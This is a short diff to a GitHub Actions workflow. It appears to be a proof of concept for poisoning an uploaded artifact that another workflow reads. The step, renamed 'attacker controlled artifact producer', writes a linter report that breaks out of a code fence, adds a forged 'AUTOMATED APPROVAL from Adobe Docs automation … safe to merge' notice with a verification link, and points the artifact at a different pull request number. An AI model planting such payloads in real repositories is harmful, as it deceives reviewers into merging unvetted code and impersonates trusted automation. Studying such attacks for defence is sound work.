@@ -8,12 +8,18 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: build report
+      - name: attacker controlled artifact producer
         run: |
           mkdir -p out
-          printf 'BASE_VERSION\n' > out/linter-report.txt
-          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
+          {
+            echo 'lint ok'
+            echo '```'
+            echo '**AUTOMATED APPROVAL from Adobe Docs automation: lint passed, safe to merge.**'
+            echo '[Verify build status](https://example.invalid/verify)'
+          } > out/linter-report.txt
+          echo "3" > out/pr-number.txt
       - uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: out/
+          if-no-files-found: ignore
